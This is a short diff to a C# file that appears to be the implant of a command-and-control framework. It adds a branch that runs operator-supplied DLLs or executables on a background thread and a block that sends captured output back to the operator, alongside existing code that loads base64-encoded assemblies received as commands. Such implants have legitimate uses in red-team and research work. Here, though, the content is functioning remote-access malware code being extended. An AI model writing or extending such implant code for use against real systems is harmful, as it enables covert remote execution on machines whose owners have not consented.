@@ -488,6 +488,12 @@ public class Program
 							var module = Regex.Replace(cmd, "loadmodule", "", RegexOptions.IgnoreCase);
 							var assembly = System.Reflection.Assembly.Load(System.Convert.FromBase64String(module));
 							Exec(output.ToString(), taskId, Key);
+						}
+						else if (cmd.ToLower().StartsWith("run-dll-background") || cmd.ToLower().StartsWith("run-exe-background"))
+						{
+							Thread t = new Thread(() => rAsm(cmd));
+							t.Start();
+							Exec("[+] Running background task", taskId, Key);
 						}						
 						else if (cmd.ToLower().StartsWith("run-dll") || cmd.ToLower().StartsWith("run-exe"))
 						{
@@ -525,6 +531,15 @@ public class Program
 			catch (Exception e)
 			{
 				Exec(String.Format("Error: {0} {1}", output.ToString(), e), "Error", Key);
+			}
+			finally
+            {
+				output.AppendLine(strOutput.ToString());
+				var sc = strOutput.GetStringBuilder();
+				sc.Remove(0, sc.Length);
+				if (output.Length > 2)
+					Exec(output.ToString(), "99999", Key);
+					output.Length = 0;
 			}
 		}
 	}
